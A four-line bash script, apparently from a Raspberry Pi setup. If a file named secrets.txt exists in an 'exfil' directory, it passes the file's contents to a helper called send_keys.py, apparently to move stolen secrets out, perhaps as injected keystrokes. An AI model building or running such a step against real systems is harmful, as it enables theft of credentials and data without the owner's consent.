#!/bin/bash
if [ -f /home/pi/exfil/secrets.txt ]; then
    python3 send_keys.py "$(cat /home/pi/exfil/secrets.txt)\n"
fi